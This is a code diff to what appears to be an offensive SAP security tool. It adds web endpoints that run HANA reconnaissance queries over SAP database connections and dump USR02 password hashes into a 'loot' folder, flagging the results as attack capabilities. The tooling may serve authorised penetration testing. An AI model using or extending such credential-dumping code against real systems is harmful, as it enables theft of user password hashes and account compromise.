@@ -13507,7 +13507,9 @@ def create_app(api: SAPMAPApi) -> Bottle:
                         f"DBCON test → {con_name}")
             try:
                 from sap_dbcon_probe import probe_dbcon_edge
-                probe_dbcon_edge(edge)
+                # Pass state so a SAP-shape probe can auto-materialise
+                # the target as a real SAPNode on the map.
+                probe_dbcon_edge(edge, state=api.state)
                 if edge.is_sap_shape:
                     sapmap_findings.emit_finding(
                         "CRITICAL", sid,
@@ -13715,6 +13717,144 @@ def create_app(api: SAPMAPApi) -> Bottle:
             _tb.print_exc()
             return json.dumps({"error":
                 f"peek crashed: {type(_ex).__name__}: {_ex}"})
+
+    @app.route("/api/node/<sid>/dbcon/describe_table", method="POST")
+    def node_dbcon_describe_table(sid):
+        """Return column metadata for schema.table — sync, small
+        payload, so the panel/overlay can render columns inline."""
+        response.content_type = "application/json"
+        data = request.json or {}
+        con_name = (data.get("con_name") or "").strip()
+        schema   = (data.get("schema") or "").strip()
+        table    = (data.get("table") or "").strip()
+        print(f"[*] {sid}: DBCON describe_table — con_name={con_name!r} "
+              f"schema={schema!r} table={table!r}")
+        if not (con_name and schema and table):
+            return json.dumps({
+                "error": "con_name, schema, table all required"})
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        edge = next((e for e in (node.dbcon_edges or [])
+                     if e.con_name.upper() == con_name.upper()), None)
+        if edge is None:
+            return json.dumps({"error": f"DBCON {con_name!r} not on {sid}"})
+        try:
+            from sap_dbcon_probe import describe_hana_table
+            return json.dumps(
+                describe_hana_table(edge, schema, table))
+        except Exception as _ex:
+            import traceback as _tb
+            _tb.print_exc()
+            return json.dumps({"error":
+                f"describe crashed: {type(_ex).__name__}: {_ex}"})
+
+    @app.route("/api/node/<sid>/dbcon/recon_sweep", method="POST")
+    def node_dbcon_recon_sweep(sid):
+        """Kick off the HANA reconnaissance sweep — runs several
+        M_* queries and caches results on edge.recon_facts.
+        Async because 7 queries × network RTT."""
+        response.content_type = "application/json"
+        data = request.json or {}
+        con_name = (data.get("con_name") or "").strip()
+        print(f"[*] {sid}: DBCON recon_sweep — con_name={con_name!r}")
+        if not con_name:
+            return json.dumps({"error": "con_name required"})
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        edge = next((e for e in (node.dbcon_edges or [])
+                     if e.con_name.upper() == con_name.upper()), None)
+        if edge is None:
+            return json.dumps({"error": f"DBCON {con_name!r} not on {sid}"})
+        if not edge.reachable:
+            return json.dumps({
+                "error": f"DBCON {con_name} not reachable — Test first"})
+
+        def _run():
+            _task_start(f"{sid}:dbcon_recon:{con_name}",
+                        f"DBCON HANA recon → {con_name}")
+            try:
+                from sap_dbcon_probe import hana_recon_sweep
+                res = hana_recon_sweep(edge)
+                if res.get("ok"):
+                    n = len([k for k, v in (res.get("facts") or {}).items()
+                              if "rows" in v])
+                    sapmap_findings.emit_finding(
+                        "MEDIUM", sid,
+                        f"DBCON {con_name} — HANA recon sweep: "
+                        f"{n}/{len(res.get('facts', {}))} queries "
+                        f"succeeded",
+                        ref="dbcon.recon.sweep",
+                        attack_capability="data.dbcon_dump")
+                else:
+                    print(f"[-] {sid}: DBCON {con_name} — recon: "
+                          f"{res.get('error')}")
+            except Exception as _ex:
+                import traceback as _tb
+                print(f"[!] {sid}: DBCON {con_name} — recon crashed: "
+                      f"{type(_ex).__name__}: {_ex}")
+                _tb.print_exc()
+            finally:
+                _task_end(f"{sid}:dbcon_recon:{con_name}")
+
+        _bg(f"{sid}:dbcon_recon:{con_name}",
+             f"DBCON recon {con_name}", _run)
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/dbcon/dump_usr02", method="POST")
+    def node_dbcon_dump_usr02(sid):
+        """Dump USR02 password hashes via direct SQL into loot/."""
+        response.content_type = "application/json"
+        data = request.json or {}
+        con_name = (data.get("con_name") or "").strip()
+        print(f"[*] {sid}: DBCON dump_usr02 — con_name={con_name!r}")
+        if not con_name:
+            return json.dumps({"error": "con_name required"})
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        edge = next((e for e in (node.dbcon_edges or [])
+                     if e.con_name.upper() == con_name.upper()), None)
+        if edge is None:
+            return json.dumps({"error": f"DBCON {con_name!r} not on {sid}"})
+        if not (edge.reachable and edge.is_sap_shape):
+            return json.dumps({
+                "error": f"DBCON {con_name} must be SAP-shape "
+                          f"reachable — USR02 dump needs USR02 present"})
+
+        def _run():
+            _task_start(f"{sid}:dbcon_usr02:{con_name}",
+                        f"DBCON USR02 dump → {con_name}")
+            try:
+                from sap_dbcon_probe import dump_usr02_hashes
+                res = dump_usr02_hashes(edge, source_node=node)
+                if res.get("ok"):
+                    ht = res.get("hash_types", {})
+                    sapmap_findings.emit_finding(
+                        "CRITICAL", sid,
+                        f"DBCON {con_name} — USR02 dumped: "
+                        f"{res.get('count', 0)} rows "
+                        f"(BCODE={ht.get('bcode', 0)}, "
+                        f"PASSCODE={ht.get('passcode', 0)}, "
+                        f"PWDSALTED={ht.get('pwdsaltedhash', 0)}) — "
+                        f"loot: {res.get('loot_path', '')}",
+                        ref="dbcon.usr02.dump",
+                        attack_capability="creds.user_password_hash")
+                else:
+                    print(f"[-] {sid}: DBCON {con_name} — USR02 dump: "
+                          f"{res.get('error')}")
+            except Exception as _ex:
+                import traceback as _tb
+                print(f"[!] {sid}: DBCON {con_name} — USR02 dump "
+                      f"crashed: {type(_ex).__name__}: {_ex}")
+                _tb.print_exc()
+            finally:
+                _task_end(f"{sid}:dbcon_usr02:{con_name}")
+
+        _bg(f"{sid}:dbcon_usr02:{con_name}",
+             f"DBCON USR02 dump {con_name}", _run)
+        return json.dumps({"status": "started"})
 
     @app.route("/api/node/<sid>/create_tcpip_dest", method="POST")
     def node_create_tcpip(sid):
